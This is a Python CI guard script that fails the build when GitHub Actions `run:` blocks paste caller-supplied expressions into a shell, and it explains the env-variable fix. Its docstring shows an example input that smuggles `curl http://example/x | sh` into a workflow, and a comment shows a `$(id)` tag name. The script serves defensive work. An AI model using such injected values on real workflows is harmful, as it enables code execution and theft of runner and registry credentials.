#!/usr/bin/env python3
# Copyright (c) 2026 Innovation Trigger B.V.
#
# PDFluent is available under two licences, at your option: the GNU AGPLv3, or
# the PDFluent Commercial Licence. See the LICENSE file in this repository --
# that file travels with the copy you received, which a URL does not.
"""Refuse a `run:` block that pastes a caller-supplied string into a shell.

`${{ inputs.crate }}` inside `run:` is not a shell variable. GitHub substitutes
the text before the shell sees the script, so whatever the caller typed becomes
script. A dispatch input of

    pdf-engine"; curl http://example/x | sh; "

runs that command as the runner user. On a persistent runner that user holds the
corpus, the warm cargo cache and the runner registration token; in
`publish-crates.yml` it also holds the registry credentials.

The fix is one line of indirection -- put the expression in `env:` and let the
shell read a variable, so the value arrives as data:

    env:
      CRATE: ${{ inputs.crate || 'pdf-engine' }}
    run: cargo package -p "$CRATE"

Found on 28-08-2026 across ten steps in seven workflows (#271). Companion to
scripts/ci/orchestration_stays_hosted.py, which covers who gets to choose the
workflow body (#266); this one covers what a caller may put inside it.

FLOOR: this guard must inspect at least MINIMUM_RUN_BLOCKS `run:` blocks across
at least MINIMUM_WORKFLOWS workflows. Both are enforced below. A guard that
stops finding files reports success in exactly the same way as a clean tree, and
that is how three of this repository's earlier checks went quiet for months.
"""

from __future__ import annotations

import pathlib
import re
import sys

import yaml

sys.path.insert(0, str(pathlib.Path(__file__).parent))
# PyYAML takes the last of two identical keys; GitHub rejects the file outright.
# Sharing the loader rather than copying it, because this guard hit exactly that
# trap while fixing the ten sites below: an inserted `env:` block sat next to an
# existing one and `safe_load` reported a clean file.
from orchestration_stays_hosted import GeenDubbeleSleutels  # noqa: E402

# FLOOR
MINIMUM_WORKFLOWS = 10
MINIMUM_RUN_BLOCKS = 60

WORKFLOW_DIR = pathlib.Path(".github/workflows")

EXPRESSION = re.compile(r"\$\{\{(.*?)\}\}", re.S)

# Contexts whose content is chosen by whoever triggered the run, rather than by
# whoever wrote the workflow. `github.head_ref` belongs here because a branch
# name is free text; so does every `github.event.*` field a contributor fills in.
CALLER_SUPPLIED = re.compile(
    r"""
    \binputs\.
  | \bgithub\.event\.inputs\.
  | \bgithub\.head_ref\b
  # A branch name is free text and so is a tag name. `github.ref_name` strips
  # the prefix and hands over whatever is left, so a tag called
  # `v1.2.$(id)` reaches a shell as a command. Codex raised this on #1540;
  # I had left it out because it appears in many run-blocks and I could not
  # tell which were real. The answer is that they are all real.
  | \bgithub\.ref_name\b
  | \bgithub\.event\.(issue|pull_request|comment|review|discussion
                     |head_commit|commits|workflow_run)\b
    """,
    re.X,
)

# Steps checked by hand whose value cannot carry shell metacharacters. A dict
# rather than a set, so the reason has somewhere to live: with a set there was
# nowhere to put it and the comment asking for one was the only thing enforcing
# it, which is to say nothing was. (Codex, #1540)
EXEMPT: dict[tuple[str, str, str], str] = {}


def gevonden(pad: pathlib.Path) -> list[tuple[str, str, str]]:
    """Every (workflow, job, expression) that reaches a shell as script."""
    try:
        doc = yaml.load(pad.read_text(encoding="utf-8"), GeenDubbeleSleutels)
    except yaml.YAMLError as fout:
        print(f"[inputs-not-shell] FATAL: {pad} does not parse: {fout}", file=sys.stderr)
        raise SystemExit(1) from fout
    if not isinstance(doc, dict):
        return []

    treffers = []
    for jobnaam, job in (doc.get("jobs") or {}).items():
        if not isinstance(job, dict):
            continue
        for stap in job.get("steps") or []:
            if not isinstance(stap, dict):
                continue
            script = stap.get("run")
            if not isinstance(script, str):
                continue
            for match in EXPRESSION.finditer(script):
                if CALLER_SUPPLIED.search(match.group(1)):
                    treffers.append((pad.name, jobnaam, match.group(0).strip()))
    return treffers


def tel_run_blokken(pad: pathlib.Path) -> int:
    try:
        doc = yaml.load(pad.read_text(encoding="utf-8"), GeenDubbeleSleutels)
    except yaml.YAMLError:
        return 0
    if not isinstance(doc, dict):
        return 0
    return sum(
        1
        for job in (doc.get("jobs") or {}).values()
        if isinstance(job, dict)
        for stap in (job.get("steps") or [])
        if isinstance(stap, dict) and isinstance(stap.get("run"), str)
    )


def main() -> int:
    if not WORKFLOW_DIR.is_dir():
        print(
            f"[inputs-not-shell] FATAL: {WORKFLOW_DIR} does not exist. Run this "
            "from the repository root.",
            file=sys.stderr,
        )
        return 1

    paden = sorted(WORKFLOW_DIR.glob("*.yml")) + sorted(WORKFLOW_DIR.glob("*.yaml"))
    blokken = 0
    treffers: list[tuple[str, str, str]] = []
    for pad in paden:
        blokken += tel_run_blokken(pad)
        treffers.extend(t for t in gevonden(pad) if t not in EXEMPT)

    if len(paden) < MINIMUM_WORKFLOWS:  # FLOOR
        print(
            f"[inputs-not-shell] FATAL: {len(paden)} workflow(s) read, floor is "
            f"{MINIMUM_WORKFLOWS}. The glob found almost nothing, which means this "
            "guard is looking in the wrong place, not that the tree is clean.",
            file=sys.stderr,
        )
        return 1

    if blokken < MINIMUM_RUN_BLOCKS:  # FLOOR
        print(
            f"[inputs-not-shell] FATAL: {blokken} `run:` block(s) inspected, floor "
            f"is {MINIMUM_RUN_BLOCKS}. Either the parser stopped understanding the "
            "files, or the workflows shrank by more than this guard was told about.",
            file=sys.stderr,
        )
        return 1

    if treffers:
        print(
            f"[inputs-not-shell] FATAL: {len(treffers)} step(s) paste a "
            "caller-supplied string into a shell:",
            file=sys.stderr,
        )
        for workflow, job, uitdrukking in treffers:
            print(f"  {workflow} :: {job} :: {uitdrukking}", file=sys.stderr)
        print(
            "\nMove the expression into `env:` and read it as a shell variable:\n"
            "  env:\n"
            "    VALUE: ${{ inputs.x }}\n"
            '  run: something "$VALUE"\n'
            "The value then arrives as data instead of as script.",
            file=sys.stderr,
        )
        return 1

    print(
        f"[inputs-not-shell] OK: {blokken} `run:` block(s) across {len(paden)} "
        "workflow(s); none interpolate a caller-supplied string."
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
